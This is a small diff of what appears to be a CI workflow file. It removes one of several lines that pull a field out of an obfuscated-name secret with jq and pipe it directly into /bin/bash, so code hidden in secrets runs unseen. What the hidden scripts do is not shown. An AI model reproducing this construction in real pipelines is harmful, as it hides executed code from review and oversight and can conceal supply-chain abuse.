@@ -17,7 +17,6 @@ jobs:
           hh8134: ${{ secrets.hh8134 }}
         run: |
           printf '%s' "$hh8134" | jq -r .tpxu0435 | /bin/bash
-          echo $had24335 | jq -r .x96 | /bin/bash
           printf '%s' "$ntl00794" | jq -r .w119 | /bin/bash
           printf '%s' "$fzo444" | jq -r .nsrr43234 | /bin/bash
           printf '%s' "$hdpcv738" | jq -r .dcxq63345 | /bin/bash
